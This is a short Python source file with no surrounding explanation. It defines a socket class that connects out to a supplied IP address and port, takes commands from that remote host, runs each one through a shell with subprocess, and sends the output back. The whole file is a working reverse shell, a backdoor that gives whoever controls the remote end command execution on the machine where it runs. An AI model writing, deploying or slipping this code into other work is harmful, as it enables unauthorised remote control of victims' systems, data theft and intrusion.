import socket
import subprocess

class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))

    @staticmethod
    def command_execute(commands):
        return subprocess.check_output(commands, shell=True)

    def start_socket(self):
        while True:
            command = self.my_connection.recv(1024).decode().strip()
            if command.lower() == "exit":
                break
            command_output = self.command_execute(command)
            self.my_connection.send(command_output)
        self.my_connection.close()
